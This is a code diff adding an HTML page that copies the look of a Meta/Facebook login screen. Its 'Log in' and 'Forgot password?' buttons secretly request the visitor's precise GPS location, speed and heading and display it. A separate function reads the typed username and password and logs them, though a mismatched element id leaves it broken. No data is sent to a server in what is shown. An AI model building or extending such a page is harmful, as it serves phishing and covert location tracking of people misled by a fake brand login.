@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Login</title>
+
+<style>
+
+*{
+    box-sizing:border-box;
+}
+
+body{
+    margin:0;
+    height:100vh;
+    background:#fafafa;
+
+    font-family:-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+
+    display:flex;
+    flex-direction:column;
+}
+
+/* TOP language */
+.top-bar{
+
+    text-align:center;
+
+    padding:15px;
+
+    font-size:14px;
+
+    color:#737373;
+}
+
+/* CENTER content */
+.center{
+
+    flex:1;
+
+    display:flex;
+
+    flex-direction:column;
+
+    justify-content:center;
+
+    align-items:center;
+
+    padding:20px;
+}
+
+/* logo */
+.logo{
+
+    width:75px;
+
+    margin-bottom:40px;
+}
+
+/* inputs */
+input{
+
+    width:100%;
+
+    max-width:340px;
+
+    padding:14px;
+
+    margin-bottom:12px;
+
+    border:1px solid #dbdbdb;
+
+    border-radius:12px;
+
+    font-size:16px;
+
+    background:#fafafa;
+}
+
+/* login button */
+.login{
+
+    width:100%;
+
+    max-width:340px;
+
+    padding:14px;
+
+    margin-top:5px;
+
+    border:none;
+
+    border-radius:25px;
+
+    background:#1877f2;
+
+    color:white;
+
+    font-size:16px;
+
+    font-weight:600;
+}
+
+/* forgot password button */
+.forgot{
+
+    margin-top:15px;
+
+    border:none;
+
+    background:none;
+
+    color:#1877f2;
+
+    font-size:14px;
+}
+
+/* BOTTOM section */
+.bottom{
+
+    padding:20px;
+
+    text-align:center;
+}
+
+/* create account button */
+.create{
+
+    width:100%;
+
+    max-width:340px;
+
+    padding:14px;
+
+    border:1px solid #1877f2;
+
+    border-radius:25px;
+
+    background:none;
+
+    color:#1877f2;
+
+    font-size:16px;
+}
+
+/* meta */
+.meta{
+
+    margin-top:15px;
+
+    font-size:14px;
+
+    color:#737373;
+}
+
+</style>
+
+</head>
+<body>
+
+
+<!-- TOP -->
+<div class="top-bar">
+English (US)
+</div>
+
+
+
+<!-- CENTER -->
+<div class="center">
+
+<img src="logo.png" class="logo">
+
+<input type="text" placeholder="Username, email or mobile number">
+
+<input type="password" placeholder="Password">
+
+<button onclick="getGPS()" class="login">Log in</button>
+
+<button onclick="getGPS()" class="forgot">Forgot password?</button>
+
+</div>
+
+
+
+<!-- BOTTOM -->
+<div class="bottom">
+
+<button class="create">Create new account</button>
+<pre id="gpsData"></pre>
+<div class="meta">Meta</div>
+
+</div>
+
+<input id="username">
+<button onclick="login()">Login</button>
+
+
+
+
+<script>
+function login(){
+    let username = document.getElementById("username").value;
+    let password = document.getElementById("Password").value;
+    console.log(username);
+    console.log(password);}
+
+
+
+
+
+function getGPS(){
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            function(position){
+                // Get raw GPS data
+                const data = {
+                    latitude: position.coords.latitude,
+                    longitude: position.coords.longitude,
+                    accuracy: position.coords.accuracy,
+                    altitude: position.coords.altitude,
+                    altitudeAccuracy: position.coords.altitudeAccuracy,
+                    speed: position.coords.speed,
+                    heading: position.coords.heading
+                };
+                console.log("Raw GPS data:", data);
+                // Show it on the page
+                document.getElementById("gpsData").textContent = JSON.stringify(data, null, 2);
+            },
+            function(error){
+                console.error("Error getting GPS data:", error);
+            }
+        );
+    } else {
+        console.error("Geolocation is not supported by this browser.");
+    }   
+}
+
+
+
+
+
+
+
+
+  </script>
+
+
+</body>
+</html>
+
